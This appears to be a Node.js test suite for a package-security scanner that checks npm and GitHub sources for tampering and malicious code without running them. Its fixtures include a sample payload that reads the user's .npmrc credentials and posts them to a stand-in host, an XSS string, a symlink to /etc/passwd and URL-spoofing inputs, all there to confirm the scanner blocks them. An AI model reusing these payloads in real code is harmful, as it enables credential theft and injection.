import test from 'node:test';
import assert from 'node:assert/strict';
import { createHash } from 'node:crypto';
import { gzipSync } from 'node:zlib';
import { LIMITS, parseReference, readBounded, safePath, unpackTar, scanReference } from '../scanner/core.mjs';
import { auditEvidence as audit } from '../scanner/engine.mjs';

function tar(entries) {
  const chunks = [];
  for (const [path, value, type = '0'] of entries) {
    const content = Buffer.from(value), header = Buffer.alloc(512);
    header.write(path); header.write(content.length.toString(8).padStart(11, '0'), 124);
    header.fill(32, 148, 156); header.write(type, 156); header.write('ustar', 257);
    header.write(header.reduce((a, b) => a + b, 0).toString(8).padStart(6, '0') + '\0 ', 148);
    chunks.push(header, content, Buffer.alloc((512 - content.length % 512) % 512));
  }
  return Buffer.concat([...chunks, Buffer.alloc(1024)]);
}
function fixture({ source = 'module.exports = 42;', extra = [], metadata = {}, manifest, osv = {}, archive: replacement } = {}) {
  const archive = replacement || gzipSync(tar([
    ['package/package.json', JSON.stringify(manifest || { name: 'fixture', version: '1.0.0' })],
    ['package/index.js', source], ...extra
  ]));
  const meta = { name: 'fixture', version: '1.0.0', dist: { tarball: 'https://registry.npmjs.org/fixture/-/fixture-1.0.0.tgz', integrity: 'sha512-' + createHash('sha512').update(archive).digest('base64') }, ...metadata };
  const calls = [];
  const fetcher = async (url, options) => {
    calls.push(url);
    assert.equal(options.credentials, 'omit'); assert.equal(options.redirect, 'error'); assert.equal(options.cache, 'no-store');
    if (url === 'https://api.osv.dev/v1/query') return Response.json(osv, { status: osv.error ? 503 : 200 });
    if (url === meta.dist?.tarball) return new Response(archive);
    assert.match(url, /^https:\/\/registry.npmjs.org\/fixture\//);
    return Response.json(meta);
  };
  return { fetcher, calls };
}
test('references allow only supported public sources, pin versions and reject URL tricks', () => {
  assert.deepEqual(parseReference('@scope/name@1.2.3'), { type: 'npm', name: '@scope/name', version: '1.2.3' });
  assert.equal(parseReference('https://github.com/owner/repo.git#main').repo, 'repo');
  assert.equal(parseReference('https://www.npmjs.com/package/fixture/v/1.0.0').version, '1.0.0');
  for (const ref of ['http://localhost/a', 'https://gitlab.com/a/b', 'https://github.com/../repo', 'git+ssh://host/a', 'file:../secret', 'npm:fixture@^1', 'https://github.com/a/b?token=x', 'https://github.com@evil.invalid/a/b']) assert.throws(() => parseReference(ref), ref);
});
test('archive rejects traversal, duplicates, damaged checksums, truncation and trailing data', () => {
  for (const path of ['/absolute', 'package/../escape', 'package/a\\b', 'package/a//b', 'package/C:drive']) assert.throws(() => safePath(path));
  assert.throws(() => unpackTar(tar([['package/../escape', 'x']])));
  assert.throws(() => unpackTar(tar([['package/a.js', 'x'], ['package/a.js', 'y']])));
  const damaged = tar([['package/a.js', 'x']]); damaged[0] ^= 1;
  assert.throws(() => unpackTar(damaged), /checksum/);
  assert.throws(() => unpackTar(tar([['package/a.js', 'x']]).subarray(0, 513)), /Truncated/);
  assert.throws(() => unpackTar(Buffer.concat([tar([]), Buffer.from('extra')])), /trailing/);
  assert.throws(() => unpackTar(tar([['package/pax', '999 path=x\n', 'x']])));
  assert.throws(() => unpackTar(tar([['package/pax', '', 'g']])));
});
test('stream byte limits and abort cancel the underlying reader', async () => {
  await assert.rejects(readBounded(new Response('abcd').body, 3), /exceeds/);
  let cancelled = false;
  const controller = new AbortController();
  const stream = new ReadableStream({ cancel() { cancelled = true; } });
  const pending = readBounded(stream, 10, controller.signal); controller.abort();
  await assert.rejects(pending, /timed out/); assert.equal(cancelled, true);
});
test('npm scans verified source and reports exact identity without installation approval', async () => {
  const r = await scanReference('fixture', { ...fixture(), audit });
  assert.equal(r.reference, 'npm:fixture@1.0.0'); assert.equal(r.verdict, 'review');
  assert.equal(r.coverage.integrity, 'verified-sha512'); assert.equal(r.coverage.scannedFiles, 2);
  assert.equal(r.installationApproved, false); assert.equal(r.coverage.executed, false);
});
test('inert credential theft is BLOCK and source never executes', async () => {
  const source = "globalThis.__pkgxrayExecuted=true;const fs=require('fs');const secret=fs.readFileSync(process.env.HOME+'/.npmrc','utf8');fetch('https://example.invalid/collect',{method:'POST',body:secret});";
  const r = await scanReference('fixture', { ...fixture({ source }), audit });
  assert.equal(r.verdict, 'block'); assert.equal(globalThis.__pkgxrayExecuted, undefined);
  assert.ok(r.findings.some(f => f.severity === 'high'));
});
test('integrity mismatch, manifest mismatch and exact version mismatch fail closed', async () => {
  const bad = fixture({ metadata: { dist: { tarball: 'https://registry.npmjs.org/fixture/-/fixture-1.0.0.tgz', integrity: 'sha512-AAAA' } } });
  await assert.rejects(scanReference('fixture', { ...bad, audit }), /integrity/);
  await assert.rejects(scanReference('fixture', { ...fixture({ manifest: { name: 'other', version: '1.0.0' } }), audit }), /manifest/);
  await assert.rejects(scanReference('fixture@2.0.0', { ...fixture(), audit }), /identity/);
});
test('metadata cannot make the browser fetch an arbitrary URL', async () => {
  for (const url of ['http://127.0.0.1/a.tgz', 'https://evil.invalid/a.tgz', 'https://user:pass@registry.npmjs.org/a.tgz', 'https://registry.npmjs.org/a.tgz?secret=x']) {
    const f = fixture({ metadata: { dist: { tarball: url } } });
    await assert.rejects(scanReference('fixture', { ...f, audit })); assert.equal(f.calls.length, 1);
  }
});
test('links, oversized source, unknown formats, and file count limits are visible gaps', async () => {
  const extra = [['package/linked.js', '/etc/passwd', '2'], ['package/huge.js', 'x'.repeat(LIMITS.file + 1)], ['package/native.node', 'data'], ...Array.from({ length: 105 }, (_, i) => [`package/f${i}.js`, 'module.exports=1;'])];
  const r = await scanReference('fixture', { ...fixture({ extra }), audit });
  assert.equal(r.coverage.scannedFiles, 100);
  for (const pattern of [/Links/, /limits/, /unknown formats/]) assert.ok(r.coverage.gaps.some(g => pattern.test(g)));
});
test('expanded archive bomb is bounded before tar parsing', async () => {
  await assert.rejects(scanReference('fixture', { ...fixture({ archive: gzipSync(Buffer.alloc(LIMITS.expanded + 1)) }), audit }), /exceeds/);
});
test('advisories block, failed lookups remain incomplete and never approve', async () => {
  const known = await scanReference('fixture', { ...fixture({ osv: { vulns: [{ id: 'GHSA-fixture', summary: '<img src=x onerror=alert(1)>' }] } }), audit });
  assert.equal(known.verdict, 'block'); assert.equal(known.advisories.length, 1);
  const missing = await scanReference('fixture', { ...fixture({ osv: { error: 'unavailable' } }), audit });
  assert.equal(missing.coverage.vulnerabilities, 'unavailable'); assert.equal(missing.installationApproved, false);
  assert.ok(missing.coverage.gaps.some(g => /lookup did not complete/.test(g)));
});
test('report keeps blocking findings before truncating informational findings', async () => {
  const r = await scanReference('fixture', { ...fixture(), audit: () => ({ verdict: 'block', findings: [...Array.from({ length: 110 }, () => ({ severity: 'info' })), { severity: 'high', rationale: 'blocking' }] }) });
  assert.equal(r.findings[0].severity, 'high'); assert.equal(r.findings.length, 100);
  assert.ok(r.coverage.gaps.some(g => /100 findings/.test(g)));
});
test('GitHub reads commit-pinned, blob-verified files and reports incomplete tree coverage', async () => {
  const sha = 'a'.repeat(40), tree = 'b'.repeat(40), content = Buffer.from('module.exports=42;');
  const blob = createHash('sha1').update(`blob ${content.length}\0`).update(content).digest('hex');
  const calls = [];
  const fetcher = async url => {
    calls.push(url);
    if (url.endsWith('/commits/main')) return Response.json({ sha, commit: { tree: { sha: tree } } });
    if (url.includes('/git/trees/')) return Response.json({ truncated: true, tree: [{ path: 'index.js', mode: '100644', type: 'blob', size: content.length, sha: blob }, { path: 'bad.js', mode: '100644', type: 'blob', size: content.length, sha: 'c'.repeat(40) }] });
    if (url.startsWith('https://raw.githubusercontent.com/')) { assert.ok(url.includes('/' + sha + '/')); return new Response(content); }
    return Response.json({});
  };
  const r = await scanReference('github:owner/repo#main', { fetcher, audit });
  assert.equal(r.identity.commit, sha); assert.equal(r.coverage.scannedFiles, 1);
  assert.ok(r.coverage.gaps.some(g => /truncated/.test(g))); assert.ok(r.coverage.gaps.some(g => /could not be fetched or verified/.test(g)));
  assert.equal(calls.length, 5);
});
